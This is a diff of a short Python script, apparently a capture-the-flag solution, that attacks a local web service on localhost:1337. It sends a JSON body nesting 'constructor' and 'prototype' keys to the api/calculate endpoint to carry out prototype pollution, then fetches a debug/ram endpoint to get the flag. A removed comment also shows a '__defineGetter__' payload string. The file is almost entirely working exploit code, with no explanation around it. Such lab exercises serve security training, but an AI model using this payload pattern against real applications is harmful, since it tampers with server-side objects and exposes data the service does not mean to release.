@@ -1,17 +1,29 @@
+# Protoype pollution
+
 import requests
 
-url = 'http://localhost:1337/api/calculate'
+url = 'http://localhost:1337/'
+action1 = 'api/calculate'
+action2 = 'debug/ram'
 
 student_data = {
-	'name':'Youtuber',
-	'paper':15,
-	'constructor': '__proto__'
+	'constructor' : {
+		'prototype' : {
+			'name':'Youtuber',
+			'paper':15,
+			'free': 'WTF'
+		}
+	}
 }
 
-response = requests.post(url, json=student_data)
+# Prototype pollution
+request = url + action1
+response = requests.post(request, json=student_data)
 
 print(response.text)
 
+# Getting flag
+request = url + action2
+response = requests.get(request)
 
-                    
-## Tipo string: '__defineGetter__': 'function(){return "Hola"}'
+print(response.text)
